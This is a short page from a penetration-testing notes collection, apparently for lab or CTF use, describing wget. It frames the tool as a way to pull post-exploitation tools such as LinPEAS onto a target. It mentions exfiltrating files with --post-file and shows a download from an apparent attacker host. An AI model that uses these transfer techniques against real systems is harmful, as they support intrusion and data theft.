---
tags:
  - tool
category: general
---

# Wget

## Description

Command-line file downloader over HTTP/HTTPS/FTP. Used constantly for pulling tools (LinPEAS, exploit scripts) onto a target, or exfiltrating files the other direction with `--post-file`.

## Installation

```bash
sudo apt install wget
```

## Common Usage

*Download a file from a server*
```bash
wget http://<ipaddress>:<port>/<path>
```

*Download and save with a specific name/path*
```bash
wget http://<ipaddress>:<port>/<path> -O <output_filename>
```

*Download quietly (no progress bar/output) - useful when running from a shell where output would be noisy*
```bash
wget -q http://<ipaddress>:<port>/<path> -O <output_filename>
```

## Flags Reference

| Flag | Description |
|---|---|
| `-O <file>` | Save to a specific filename |
| `-q` | Quiet mode |
| `-P <dir>` | Save into a specific directory |
| `--no-check-certificate` | Skip TLS certificate validation (useful for self-signed certs on an attack box's HTTPS server) |
| `-r` | Recursive download |

## Example Output

```
$ wget http://10.10.14.5:8000/linpeas.sh
--2026-01-01 12:00:00--  http://10.10.14.5:8000/linpeas.sh
Connecting to 10.10.14.5:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 845102 (825K)
Saving to: 'linpeas.sh'
linpeas.sh          100%[===================>] 825.29K  --.-KB/s   in 0.05s
```

## Notes / Gotchas

- Not present on every minimal Linux install - if `wget` isn't there, fall back to `curl`, or a Python one-liner with `urllib`.
- On Windows targets there's no native `wget` - use `Invoke-WebRequest`/`certutil` instead (see [File Transfers](../Knowledge%20Base/Misc/File%20Transfers.md)).

## Related

- [File Transfers](../Knowledge%20Base/Misc/File%20Transfers.md)
- [Python](Python.md) - for hosting the file being downloaded
